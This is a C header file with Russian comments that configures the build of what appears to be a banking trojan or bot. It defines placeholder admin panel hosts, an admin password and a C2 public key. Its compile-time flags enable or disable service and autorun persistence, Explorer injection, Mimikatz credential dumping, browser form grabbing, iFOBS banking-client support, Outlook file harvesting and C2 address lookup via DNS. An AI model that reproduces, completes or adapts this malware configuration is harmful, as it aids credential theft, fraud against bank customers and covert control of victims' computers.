#pragma once

//полная релизная версия
#include "..\builder.h"

#define ADMIN_PANEL_HOSTS MASK_ADMIN_PANEL_HOSTS
#define ADMIN_AZ MASK_ADMIN_AZ
#define USER_AZ MASK_USER_AZ
#define VIDEO_SERVER_IP MASK_VIDEO_SERVER_IP
#define FLAGS_VIDEO_SERVER MASK_FLAGS_VIDEO_SERVER
#define ADMIN_PASSWORD MASK_ADMIN_PASSWORD
#define PREFIX_NAME MASK_PREFIX_NAME
#define PERIOD_CONTACT MASK_PERIOD_CONTACT
#define MISC_STATE MASK_MISC_STATE

//настройки для отключения разных функций
//отключить установку сервиса
//#define OFF_SERVICE
//#define OFF_SDPROP
//отключить уставновку в автозапуск (в тот что в меню винды)
//#define OFF_AUTORUN
//все отсылаемые данные (скриншоты, логи) ложатся в папку c:\botdebug
//#define ON_SENDDATA_FOLDER
//все плагины берутся из папки c:\plugins
//#define ON_PLUGINS_FOLDER

#define ON_VIDEOSERVER
//при работе не использовать проводник (не инжектится в него)
#define NOT_EXPLORER
//подключение ифобс
//#define ON_IFOBS
//подключение функций из программы mimikatz
#ifndef WIN64
#define ON_MIMIKATZ
#endif
//включает граббинг данных с форм браузера
//#define ON_FORMGRABBER

//включение вложенных плагинов
//#define PLUGINS_TRUSTED_HOSTS
//#define PLUGINS_FIND_OUTLOOK_FILES
//после поиска нужно завершить работу бота
//#define PLUGINS_FIND_OUTLOOK_FILES_EXIT
//#define PLUGINS_MONITORING_FILE

//запрашивает IP админки и при получении корректного адреса запускает серверную часть которая коннектится по этому IP
//#define IP_SERVER_FROM_DNS
//стучать на зашитый внешней прогой IP сервера
//#define IP_SERVER_EXTERNAL_IP

#define PUBLIC_KEY MASK_PUBLIC_KEY

#define DATE_WORK MASK_DATE_WORK
